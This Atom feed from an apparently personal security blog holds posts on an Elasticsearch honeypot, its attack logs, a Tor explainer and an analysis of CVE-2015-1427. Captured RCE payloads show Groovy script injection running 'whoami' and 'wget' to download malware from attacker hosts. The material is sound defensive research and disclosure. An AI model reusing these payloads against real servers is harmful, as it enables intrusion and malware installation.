<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[jordan-wright]]></title>
  <link href="http://jordan-wright.github.io/atom.xml" rel="self"/>
  <link href="http://jordan-wright.github.io/"/>
  <updated>2015-05-10T20:02:14-05:00</updated>
  <id>http://jordan-wright.github.io/</id>
  <author>
    <name><![CDATA[Jordan]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[60 Days of Watching Hackers Attack Elasticsearch]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch/"/>
    <updated>2015-05-11T17:00:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/05/11/60-days-of-watching-hackers-attack-elasticsearch</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/elk_results.png"/></p>

<h3>Introduction</h3>

<p>Two months ago, one of my DigitalOcean instances started attacking another host with massive amounts of bogus traffic. I was notified by the abuse team at DO that my VPS was participating in a DDoS attack. I managed to track down that the attackers leveraged an <a href="http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">RCE vulnerability in Elasticsearch</a> to automatically download and run malware.</p>

<p>After re-building the box from scratch (with many improvements!), I <a href="http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/">created a honeypot</a> called Elastichoney to measure how much this vulnerability is being exploited in the wild. Since then, I&rsquo;ve had multiple sensors silently logging all attempts to exploit this vulnerability.</p>

<p>Here are the results.</p>

<!--more-->


<h3>Who&rsquo;s Attacking Me?</h3>

<p><a href="https://github.com/jordan-wright/elastichoney">Elastichoney</a> keeps track of quite a bit of data, including the source IP and payload sent to the sensor. I logged every attack to an Elasticsearch instance (have some irony &ndash; free of charge!) and enriched the data with geoip information using Logstash. Finally, I created a slick dashboard using Kibana to view the results.</p>

<p>So far, I&rsquo;ve had around 8k attempts to attack the honeypots from over 300 unique IP addresses. One of the immediate things I noticed was thing a vast majority (over 93%) of attacks were coming from Chinese IP addresses:</p>

<p><img src="http://jordan-wright.github.io/images/blog/elastichoney_elk/map.png"/></p>

<p>The second thing that I noticed was how fast the majority of exploit attempts died down. Here&rsquo;s a histogram of attack attempts since the sensors have been running:</p>

<p><img src="http://jordan-wright.github.io/images/blog/elastichoney_elk/histogram.png"/></p>

<p>You&rsquo;ll notice a spike between March 20<sup>th</sup> and April 11<sup>th</sup>. These attacks came from a few Chinese IP addresses that all stopped their attacks at the same time. But hey, attacks come in, attacks go out. <a href="http://cdn.meme.am/instances/500x/58834359.jpg">You can&rsquo;t explain that.</a></p>

<h3>What are the Attackers Doing?</h3>

<p>I mentioned that Elastichoney logs the payload sent to the sensor. In some cases, these were attempts to run boring commands like <code>whoami</code>, etc. However, in quite a few cases, the malware attempted to use <code>wget</code> to download and run malware &ndash; similar to what happened to my DO instance.</p>

<p>These looked something like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>source={"query":+{"filtered":+{"query":+{"match_all":+{}}}},+"script_fields":+{"exp":+{"script":+"import+java.util.*;import+java.io.*;String+str+=+\"\";BufferedReader+br+=+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec(\"wget+-O+/tmp/zuosyn+http://115.28.216.181:995/zuosyn\").getInputStream()));StringBuilder+sb+=+new+StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"}},+"size":+1}</span></code></pre></td></tr></table></div></figure>


<p>These malware samples were generally nothing more than basic bots. They could be compiled ELF binaries, or simple Perl scripts. While we&rsquo;re working to let Elastichoney automatically download these malware samples, for now the data is in the logs. Speaking of logs&hellip;</p>

<h3>The Raw Data</h3>

<p>I&rsquo;m a fan of open-sourcing as much information as possible if it helps the community. As such, I&rsquo;ve decided to release all the logs I currently have.</p>

<p>You can download the raw JSON logs <a href="http://jordan-wright.github.io/downloads/elastichoney_logs.json.gz">here</a>. Here&rsquo;s an example log to show how the logs are structured&#8217;:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="nt">&quot;source&quot;</span><span class="p">:</span> <span class="s2">&quot;222.186.56.46&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;@timestamp&quot;</span><span class="p">:</span> <span class="s2">&quot;2015-05-10T15:44:56.803Z&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;url&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x:9200/_search?&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;method&quot;</span><span class="p">:</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;form&quot;</span><span class="p">:</span> <span class="s2">&quot;form_payload&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;payload&quot;</span><span class="p">:</span> <span class="s2">&quot;json_payload&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;headers&quot;</span><span class="p">:</span> <span class="p">{</span>
</span><span class='line'>        <span class="nt">&quot;user_agent&quot;</span><span class="p">:</span> <span class="s2">&quot;python-requests/2.4.1 CPython/2.7.8 Windows/2003Server&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x:9200&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;content_type&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;accept_language&quot;</span><span class="p">:</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>    <span class="p">},</span>
</span><span class='line'>    <span class="nt">&quot;type&quot;</span><span class="p">:</span> <span class="s2">&quot;attack&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;honeypot&quot;</span><span class="p">:</span> <span class="s2">&quot;x.x.x.x&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;@version&quot;</span><span class="p">:</span> <span class="s2">&quot;1&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;host&quot;</span><span class="p">:</span> <span class="s2">&quot;127.0.0.1:39642&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;Python Requests&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;os&quot;</span><span class="p">:</span> <span class="s2">&quot;Windows&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;os_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Windows&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;device&quot;</span><span class="p">:</span> <span class="s2">&quot;Other&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;major&quot;</span><span class="p">:</span> <span class="s2">&quot;2&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;minor&quot;</span><span class="p">:</span> <span class="s2">&quot;4&quot;</span><span class="p">,</span>
</span><span class='line'>    <span class="nt">&quot;geoip&quot;</span><span class="p">:</span> <span class="p">{</span>
</span><span class='line'>        <span class="nt">&quot;ip&quot;</span><span class="p">:</span> <span class="s2">&quot;222.186.56.46&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;country_code2&quot;</span><span class="p">:</span> <span class="s2">&quot;CN&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;country_code3&quot;</span><span class="p">:</span> <span class="s2">&quot;CHN&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;country_name&quot;</span><span class="p">:</span> <span class="s2">&quot;China&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;continent_code&quot;</span><span class="p">:</span> <span class="s2">&quot;AS&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;region_name&quot;</span><span class="p">:</span> <span class="s2">&quot;04&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;city_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Nanjing&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;latitude&quot;</span><span class="p">:</span> <span class="mf">32.0617</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;longitude&quot;</span><span class="p">:</span> <span class="mf">118.77780000000001</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;timezone&quot;</span><span class="p">:</span> <span class="s2">&quot;Asia/Shanghai&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;real_region_name&quot;</span><span class="p">:</span> <span class="s2">&quot;Jiangsu&quot;</span><span class="p">,</span>
</span><span class='line'>        <span class="nt">&quot;location&quot;</span><span class="p">:</span> <span class="p">[</span><span class="mf">118.77780000000001</span><span class="p">,</span> <span class="mf">32.0617</span><span class="p">]</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As always, let me know if you have any questions or comments below!</p>

<p>Jordan</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Tor Works: Part Two - Relays vs. Bridges]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges/"/>
    <updated>2015-05-09T15:00:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/05/09/how-tor-works-part-two-relays-vs-bridges</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/how_tor_works_2.png"/></p>

<h3>Introduction</h3>

<p>Welcome back to my series on how Tor works! In the <a href="http://jordan-wright.github.io/blog/2015/02/28/how-tor-works-part-one/">last post</a>, we took a look at how Tor operates from a very high level. In this post, we&rsquo;ll dive a bit deeper, taking a look at a potential issue with relays in order to introduce a new concept: <strong>bridges</strong>.</p>

<!--more-->


<h3>Relay Recap</h3>

<p>In the last post, we introduced relays as systems designed to move traffic in the Tor network. You&rsquo;ll recall that there were three types of relays:</p>

<ul>
<li><strong>Entry/Guard Relays</strong> &ndash; Entry points into the Tor network</li>
<li><strong>Middle Relays</strong> &ndash; Send traffic from an entry relay to an exit relay</li>
<li><strong>Exit Relays</strong> &ndash; Send the traffic out of the Tor network to the original destination</li>
</ul>


<p>Relays are created by volunteers by simply configuring the Tor software to act as a relay. As a reminder, if you have bandwidth to spare, consider setting up a Tor relay!</p>

<h3>The Problem With Relays</h3>

<p>When a Tor client starts up, it needs a way to fetch a list of all the entry, middle, and exit relays available. This list of all relays isn&rsquo;t a secret. In fact, in the next post I&rsquo;ll explain in detail how this list is distributed (for a sneak peek check out documents on the <em>concensus</em>). While making this list public is necessary, it also presents a problem.</p>

<p>To figure out why this is problem, let&rsquo;s play the role of the attacker and ask ourselves: <em>What Would an Oppressive Government Do (WWOGD)?</em>. By thinking to ourselves what a <strong><em>real OG</em></strong> would do, we can figure out why Tor is built the way it is.</p>

<p>So what would a real OG do? Since censorship is a pretty big deal, and Tor is pretty darn good at getting around it, a real OG would want to block users from using Tor. There are two ways to &ldquo;block Tor users&rdquo;:</p>

<ul>
<li>Block users coming out of Tor</li>
<li>Block users going into Tor</li>
</ul>


<p>The first situation is possible, and is up to the discretion of the device (router, etc.) or website owner. All a site owner needs to do is to download the list of Tor exit nodes and block all traffic from those nodes. While this would be unfortunate, there&rsquo;s nothing Tor can really do about it.</p>

<p>However, the second situation is much worse. While blocking incoming Tor users can keep them from a particular site, blocking users from going into Tor will keep them from <strong>every</strong> site, making Tor effectively useless to those under censorship &ndash; some of the users who need Tor most. Just using relays, this is possible since real OG&rsquo;s can just download a list of all guard relays and block any traffic to them.</p>

<p>Thankfully, the Tor project thought of exactly this situation and came up with a clever solution around it. Say hello to <strong>bridges</strong>.</p>

<h3>Introducing Bridges</h3>

<p><a href="https://www.torproject.org/docs/bridges.html.en">Bridges</a> are a clever solution to this problem. At their core, bridges are just unpublished entry relays. Users that are behind censored networks can use bridges as a way to access the Tor network.</p>

<p>So if bridges are unpublished, how do users know where they are? Won&rsquo;t a master list need to be published somewhere? We&rsquo;ll talk more about these master lists of relays and bridges in the next post, but for now the answer is yes &ndash; there is a list of bridges maintained by the Tor project.</p>

<p><strong>This list just isn&rsquo;t made public.</strong></p>

<p>Instead, the Tor project has created a way for users to receive a small list of bridges so that they can connect to the rest of the Tor network. This project, called <a href="https://bridges.torproject.org/bridges">BridgeDB</a> gives users the information about a few bridges at a time. This makes sense, since a few bridges should be all any user needs.</p>

<p>By only giving users a few bridges at a time, it is possible to prevent OG&rsquo;s from blocking all possible entry points into the Tor network. Sure, as relays are discovered they can be blocked, but can anyone really discover all the bridges?</p>

<h3>Can Anyone Find Every Bridge?</h3>

<p>The list of all bridges is a closely guarded secret. If a real OG were able to gain access to this list, it would be able to completely block users from using Tor. With this being the case, there has been <a href="https://blog.torproject.org/blog/research-problems-ten-ways-discover-tor-bridges">research</a> done by the Tor project into possible ways people could discover all the bridges.</p>

<p>I&rsquo;d like to talk very briefly about #2 and #6 on that list, since that&rsquo;s <a href="https://zmap.io/paper.pdf"><em>exactly</em></a> <a href="http://www.cs.uml.edu/~xinwenfu/paper/Bridge.pdf">what</a> researchers have done with some significant success. In the first scenario, researchers scanned the entire IPv4 space using a fast port scanner called ZMap looking for Tor bridges and &ldquo;were able to identify 79–86%&rdquo;<sup>1</sup> of them. I recommend reading the paper for the really cool technical details (about finding Tor bridges and ZMap in general).</p>

<p>The second scenario is a neat one and introduces an important challenge for Tor (or any network for that matter). It all comes down to a simple concept &ndash; <em>users can&rsquo;t be trusted</em>. In order to keep the Tor network as anonymous and locked down as possible, the Tor network is designed in such a way to intentionally distrust relay operators. We&rsquo;ll see more examples of this later.</p>

<h3>Next Steps</h3>

<p>In this post, we&rsquo;ve talked about the need for relays that aren&rsquo;t published in some &ldquo;master list&rdquo;. But, you&rsquo;ll notice I didn&rsquo;t give many details about <em>how</em> this master list is created, or how Tor clients get access to the list.</p>

<p>So, in our next post, we&rsquo;ll take a look at how the Tor network maintains the status of all relays in the network. We&rsquo;ll also introduce some very powerful relays in the Tor network who run the show &ndash; <strong>directory authorities</strong>.</p>

<p>As always, please let me know if you have any questions or comments below!</p>

<p>Jordan</p>

<p><sup>[1] <a href="https://zmap.io/paper.pdf">https://zmap.io/paper.pdf</a></sup></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Tor Works Part Three - The Consensus]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/05/01/how-tor-works-part-three-the-consensus/"/>
    <updated>2015-05-01T17:58:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/05/01/how-tor-works-part-three-the-consensus</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/how_tor_works_2.png"/></p>

<h3>Introduction</h3>

<p>Welcome to the third post in my series on how Tor works! In the past two posts, we talked about how clients tunnel traffic through relays, as well as introduced the idea of bridges.</p>

<p>But how do clients know what relays are active? How is the Tor network actually organized? This post will take a look at</p>

<h3>Respect My Authoritah</h3>

<h3>I Made a Poster</h3>

<p>Here it is:</p>

<p><a href="http://jordan-wright.github.io/images/blog/how_tor_works/consensus.png"><img src="http://jordan-wright.github.io/images/blog/how_tor_works/consensus_small.png"/></a></p>

<h3>Next Steps</h3>

<p>You&rsquo;ll notice that we haven&rsquo;t really covered exit relays. These relays hold a very important position in the Tor network, and deserve their own discussion. So, in the next post we&rsquo;ll talk about how exit relays work, and what happens when exit relay operators decide to &ldquo;break bad&rdquo;, or wreak havoc on Tor users.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[What Happens When Tor Exit Nodes Break Bad?]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/04/30/what-happens-when-tor-exit-nodes-break-bad/"/>
    <updated>2015-04-30T21:40:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/04/30/what-happens-when-tor-exit-nodes-break-bad</id>
    <content type="html"><![CDATA[
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Introducing elastichoney - an Elasticsearch Honeypot]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/"/>
    <updated>2015-03-23T06:30:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/elastichoney.png"/></p>

<h3>Introduction</h3>

<p>I recently <a href="http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">wrote</a> about an Elasticsearch RCE vulnerability that is being heavily exploited in the wild. To see what kind of attacks are taking place, I decided to write a simple honeypot designed to mimic a vulnerable Elasticsearch (ES) instance. Say hello to <a href="http://github.com/jordan-wright/elastichoney">elastichoney</a>!</p>

<!--more-->


<h3>How it Works</h3>

<p>This honeypot is pretty simple. It takes requests on the <code>/</code>, <code>/_search</code>, and <code>/_nodes</code> endpoints and returns a JSON response that is identical to a vulnerable ES instance (should be identical &ndash; I took the responses straight from one of my hosts that got 0wned).</p>

<p>Attacks are logged as soon as they are detected. By default, elastichoney logs the attacks in JSON format to <code>stdout</code>, as well as to a file called <code>elastichoney.log</code>.</p>

<p>It&rsquo;s important to note that this is by no means foolproof. Clever people can take a look at <a href="http://github.com/jordan-wright/elastichoney">the code</a> and quickly find ways to detect the honeypot. It&rsquo;s not perfect, but it works. Let&rsquo;s take a look at some results.</p>

<h3>Results</h3>

<p>Very quickly after I deployed the honeypot, I started getting hit by attackers scanning large swathes of the Internet looking for vulnerable systems. To date, I&rsquo;ve seen approx. 2000 attacks from over 60 unique IP&rsquo;s over the course of a few days, all without advertising my elastichoney instance anywhere.</p>

<p>Here&rsquo;s an entry from my logs that is attempting to exploit the CVE-2015-1427 that I wrote about:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{
</span><span class='line'>    "source": "[redacted]",
</span><span class='line'>    "@timestamp": "2015-03-23T13:34:22.519890008-05:00",
</span><span class='line'>    "url": "[redacted]:9200/_search?pretty",
</span><span class='line'>    "method": "POST",
</span><span class='line'>    "form": "pretty=&{\"script_fields\":+{\"iswin\":+{\"lang\":+\"groovy\",+\"script\":+\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).\\tnewInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.\\tclass).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"whoami\\\").\\tgetInputStream())).readLines()\"}},+\"size\":+1}=",
</span><span class='line'>    "payload": "",
</span><span class='line'>    "headers": {
</span><span class='line'>        "user_agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36",
</span><span class='line'>        "host": "[redacted]:9200",
</span><span class='line'>        "content_type": "application/x-www-form-urlencoded",
</span><span class='line'>        "accept_language": ""
</span><span class='line'>    },
</span><span class='line'>    "type": "attack",
</span><span class='line'>    "honeypot": "[redacted]"
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Now, I&rsquo;m sure you&rsquo;re interested in some samples. <a href="https://gist.githubusercontent.com/jordan-wright/f63575681373f91e462f/raw/b446a9d3bb042aac425970d73c129d4d936478aa/elastichoney.log">Here&rsquo;s</a> a bit of what I have so far. There&rsquo;s some nifty <code>wget</code> calls in there if you grab them fast enough.</p>

<p>Enjoy!</p>

<h3>Want to Run This Yourself?</h3>

<p><em>Awesome.</em> Let&rsquo;s take a look at what it takes to get elastichoney up and running. Installation should take about&hellip; 5 seconds. Since this is written in Go, I can provide binaries for most platforms. If you&rsquo;re interested in running elastichoney yourself, just download <a href="http://github.com/jordan-wright/elastichoney/releases">the right binary</a> for your system, edit the config to your liking, and start it up!</p>

<p>Let&rsquo;s talk about some of the config options. The first option to note is <code>use_remote</code>. I mentioned that elastichoney will log to <code>stdout</code> and a file by default. You can set this option to also have the honeypot send an HTTP <code>POST</code> containing the JSON entry to a remote server of your choosing. Personally, I have my entries going to a real elasticsearch instance so I can search on them later.<sup>1</sup></p>

<p>The second config option that you may want to play with is the <code>spoofed_version</code> option. This lets you pick what version of ES you want your honeypot to show up as. This helps if you are looking for attackers targeting specific systems (such as those targeting the &lt;=v1.2 RCE vuln vs the most recent RCE vuln).</p>

<p>Finally, the last option you might set is the <code>anonymous</code> option. This simply determines if you want your honeypot IP to show up in logs. If so, elastichoney will make a single call out to icanhazip.com when it starts up to get the external IP. Otherwise, it&rsquo;ll just use <code>1.1.1.1</code><sup>2</sup>. This is helpful if you want to create an anonymous cluster of honeypots.</p>

<p>As always, let me know if you have any questions or comments below.</p>

<p>-Jordan</p>

<p>[1] Irony.<br/>
[2] Big shout-out to the person actually on <code>1.1.1.1</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Remote Code Execution in Elasticsearch - CVE-2015-1427]]></title>
    <link href="http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/"/>
    <updated>2015-03-08T13:40:00-05:00</updated>
    <id>http://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427</id>
    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/elk_rce.png"/></p>

<blockquote><p>TL;DR If you have an elasticsearch instance that is publicly available, upgrade to 1.4.3 or later <strong>now</strong>.</p></blockquote>

<p>Elasticsearch (the &ldquo;E&rdquo; in ELK) is a full-text search engine that makes data aggregation and querying easy. It has an extensive JSON API that allows everything from searching to system management. This post will show how a new vulnerability, CVE-2015-1427, allows attackers to leverage features of this API to gain unauthenticated remote code execution (RCE).</p>

<blockquote><p>Much of the analysis discovering this vulnerability was originally found on a blog post <a href="http://drops.wooyun.org/papers/5107">here</a> (<a href="https://translate.google.com/translate?hl=en&amp;sl=zh-CN&amp;tl=en&amp;u=http%3A%2F%2Fdrops.wooyun.org%2Fpapers%2F5107">translated</a>). This post aims to translate and provide more detail on the vulnerability.</p></blockquote>

<!--more-->


<h3>This Isn&rsquo;t Elasticsearch&rsquo;s First Rodeo</h3>

<p>One feature of the <code>_search</code> API endpoint is to allow users to <a href="http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/modules-scripting.html">submit Groovy code</a> in the search query itself. The server will then execute the code in a sandboxed environment, returning the result to the user. This way, the elasticsearch code can be used to execute&hellip; more code<sup>1</sup></p>

<p>Allowing anybody to submit server-side code to get executed is a <em>dangerous</em> game to play. In fact, this isn&rsquo;t the first time Elasticsearch has been bitten by this feature. Elasticsearch pre-1.2 didn&rsquo;t have a sandbox <em>at all</em>, and allowed anyone to submit code to be executed. Since there are zero authentication controls built into elasticsearch, if the service is exposed to the Internet, anyone can own a server with a query like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>{"query":
</span><span class='line'>    {"filtered": {
</span><span class='line'>        "query": {"match_all": {}}}},
</span><span class='line'>        "script_fields": {"exp": {
</span><span class='line'>            "script": "import java.util.*;import java.io.*;String str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"wget -O /tmp/malware http://x.x.x.x/malware \").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);sb.append(\"\r\n\");}sb.toString();"
</span><span class='line'>    }}}</span></code></pre></td></tr></table></div></figure>


<blockquote><p>Fun fact! This is an actual exploit attempt I&rsquo;ve seen on my server.</p></blockquote>

<p>This isn&rsquo;t anything new. In fact, there&rsquo;s a <a href="http://www.rapid7.com/db/modules/exploit/multi/elasticsearch/script_mvel_rce">Metasploit module</a> that makes this easy.</p>

<p>Starting with version 1.3, Elasticsearch <a href="http://www.elasticsearch.org/blog/scripting/">allowed sending Groovy scripts</a> in the query again. However, they added a sandbox to control what classes and functions can be executed.</p>

<p>Let&rsquo;s take a quick look at how the sandbox works to get a feel for how it can be exploited.</p>

<h3>How the Sandbox Works</h3>

<p>The functions and classes that are allowed by the sandbox are found in <a href="https://github.com/elasticsearch/elasticsearch/blob/master/src/main/java/org/elasticsearch/script/groovy/GroovySandboxExpressionChecker.java"><code>GroovySandboxExpressionChecker.java</code></a>. Looking at the code, we notice the function <code>isAuthorized</code>. This function takes in an expression and checks to see if it is allowed to be executed.</p>

<p>Without going through <strong>everything</strong> the sandbox does, here&rsquo;s the important part of the function:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">expression</span> <span class="k">instanceof</span> <span class="n">MethodCallExpression</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="n">MethodCallExpression</span> <span class="n">mce</span> <span class="o">=</span> <span class="o">(</span><span class="n">MethodCallExpression</span><span class="o">)</span> <span class="n">expression</span><span class="o">;</span>
</span><span class='line'>    <span class="n">String</span> <span class="n">methodName</span> <span class="o">=</span> <span class="n">mce</span><span class="o">.</span><span class="na">getMethodAsString</span><span class="o">();</span>
</span><span class='line'>    <span class="k">if</span> <span class="o">(</span><span class="n">methodBlacklist</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">methodName</span><span class="o">))</span> <span class="o">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">methodName</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">mce</span><span class="o">.</span><span class="na">getMethod</span><span class="o">()</span> <span class="k">instanceof</span> <span class="n">GStringExpression</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>        <span class="c1">// We do not allow GStrings for method invocation, they are a security risk</span>
</span><span class='line'>        <span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
</span><span class='line'>    <span class="o">}</span>
</span><span class='line'>    <span class="c1">//snip</span>
</span><span class='line'><span class="o">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is the condition that checks to see if our method call is allowed to be executed. There are two checks we need to bypass in order to make this happen:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="k">if</span> <span class="o">(</span><span class="n">methodBlacklist</span><span class="o">.</span><span class="na">contains</span><span class="o">(</span><span class="n">methodName</span><span class="o">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>The <code>methodBlacklist</code> contains the following method calls that we can&rsquo;t use:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
